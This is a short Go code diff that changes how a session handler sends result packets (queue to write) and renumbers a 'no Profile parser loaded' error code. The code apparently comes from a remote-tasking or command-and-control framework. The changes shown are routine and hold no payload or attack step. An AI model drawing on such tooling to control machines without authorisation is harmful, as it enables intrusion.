@@ -73,7 +73,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 				r.Flags |= com.FlagError
 				r.WriteString(err.Error())
 			}
-			s.queue(r)
+			s.write(true, r)
 			return true
 		}
 		r.Clear()
@@ -88,7 +88,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 	}
 	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
 	r.WriteString("0x404")
-	s.queue(r)
+	s.write(true, r)
 	return false
 }
 func executeTask(t task.Tasker, s *Session, n *com.Packet) {
@@ -206,7 +206,7 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			return true, os.ErrNotExist
 		}
 		if ProfileParser == nil {
-			return true, xerr.Sub("no Profile parser loaded", 0x8)
+			return true, xerr.Sub("no Profile parser loaded", 0x15)
 		}
 		var (
 			b string
@@ -287,7 +287,7 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 		return true, nil
 	case task.MvProfile:
 		if ProfileParser == nil {
-			return true, xerr.Sub("no Profile parser loaded", 0x8)
+			return true, xerr.Sub("no Profile parser loaded", 0x15)
 		}
 		b, err := n.Bytes()
 		if err != nil {
